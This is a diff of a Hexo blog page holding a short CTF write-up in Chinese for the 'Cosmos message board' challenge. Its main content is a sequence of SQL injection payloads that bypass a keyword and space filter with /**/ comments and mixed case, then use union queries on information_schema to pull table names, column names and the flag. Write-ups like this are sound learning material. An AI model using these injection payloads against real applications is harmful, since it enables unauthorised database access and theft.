@@ -7,7 +7,7 @@
 
 <html class="theme-next gemini use-motion" lang="en">
 <head>
-  <meta charset="UTF-8"/>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 <meta name="theme-color" content="#222">
@@ -146,7 +146,7 @@
 
 
 
-  <title>hgame-Cosmos的留言板-1 | diao-diao-UPUP</title>
+  <title>hgame-Cosmos的留言板-1 | diao-diao-UPUP</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
   
 
 
@@ -165,7 +165,7 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -412,12 +412,16 @@
 <p>最后得知过滤掉了select和空格</p>
 <p>这里有很多个方法 用/**/块注释代替空格<br>select的话可以用sel&lt;&gt;ect进行截断<br>或者大小写混写 SelecT</p>
 <p>再构造payload:</p>
-<pre><code>-1&apos;/**/or/**/&apos;1&apos;=&apos;1  回显正常</code></pre><p>爆表：</p>
-<pre><code>-1&apos;/**/union/**/SelecT/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/having&apos;1&apos;=&apos;1
-得到表名 f1aggggggggggggg</code></pre><p>爆字段：</p>
-<pre><code>-1&apos;/**/union/**/SelecT/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&apos;f1aggggggggggggg&apos;/**/having&apos;1&apos;=&apos;1
-得到字段名fl4444444g</code></pre><p>查询：</p>
-<pre><code>-1&apos;/**/union/**/SelecT/**/fl4444444g/**/from/**/f1aggggggggggggg/**/having&apos;1&apos;=&apos;1</code></pre><p>得到flag</p>
+<pre><code>-1&#39;/**/or/**/&#39;1&#39;=&#39;1  回显正常
+</code></pre><p>爆表：</p>
+<pre><code>    -1&#39;/**/union/**/SelecT/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/having&#39;1&#39;=&#39;1
+    得到表名 f1aggggggggggggg
+</code></pre><p>爆字段：</p>
+<pre><code>    -1&#39;/**/union/**/SelecT/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#39;f1aggggggggggggg&#39;/**/having&#39;1&#39;=&#39;1
+    得到字段名fl4444444g
+</code></pre><p>查询：</p>
+<pre><code>    -1&#39;/**/union/**/SelecT/**/fl4444444g/**/from/**/f1aggggggggggggg/**/having&#39;1&#39;=&#39;1
+</code></pre><p>得到flag</p>
 
       
     </div>
@@ -541,7 +545,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-count">43</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1143,6 +1147,8 @@
   
 
   
+  
+
 
   
 
@@ -1150,7 +1156,7 @@
 
   
   <!-- 页面点击小红心 -->
-<script type="text/javascript" src="/js/src/clicklove.js"></script>
+<script type="text/javascript" src="/js/src/clicklove.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 
 </body>
 </html>
